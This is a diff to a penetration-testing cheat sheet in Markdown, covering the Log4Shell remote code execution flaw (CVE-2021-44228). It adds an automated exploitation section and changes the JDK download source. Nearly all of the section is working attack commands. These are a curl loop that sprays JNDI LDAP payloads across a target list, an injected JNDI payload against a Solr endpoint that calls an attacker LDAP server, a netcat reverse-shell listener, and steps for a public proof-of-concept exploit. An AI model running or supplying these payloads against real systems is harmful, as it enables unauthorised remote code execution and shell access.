@@ -424,13 +424,15 @@ $ curl 'http://<RHOST>:3000/public/plugins/welcome/../../../../../../../../var/l
 
 ## CVE-2021-44228: Log4Shell RCE (0-day)
 
+### Testing
+
 ```c
-cat targets.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "X-Api-Version: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "User-Agent: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}";done
+$ cat targets.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "X-Api-Version: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "User-Agent: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}";done
 ```
 
-### Preparation
+### Pre-requisistes
 
-> http://mirrors.rootpei.com/jdk/
+> https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html
 
 File: jdk-8u181-linux-x64.tar.gz
 
@@ -501,10 +503,34 @@ $ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServe
 $ nc -lnvp 9001
 ```
 
-### Execute the Payload
+### Execution
 
 ```c
 $ curl 'http://<RHOST>:8983/solr/admin/cores?foo=$\{jndi:ldap://<LHOST>:1389/Exploit\}'
+```
+
+#### Automatic Exploitation
+
+> https://github.com/kozmer/log4j-shell-poc
+
+##### Pre-requisistes
+
+> https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html
+
+```c
+$ tar -xvf jdk-8u20-linux-x64.tar.gz
+```
+
+##### Start the Listener
+
+```c
+$ python poc.py --userip <LHOST> --webport <RPORT> --lport <LPORT>                                   
+```
+
+##### Execution
+
+```c
+${jndi:ldap://<LHOST>:1389/foobar}
 ```
 
 ## CVE-2022-0847: Dirty Pipe LPE
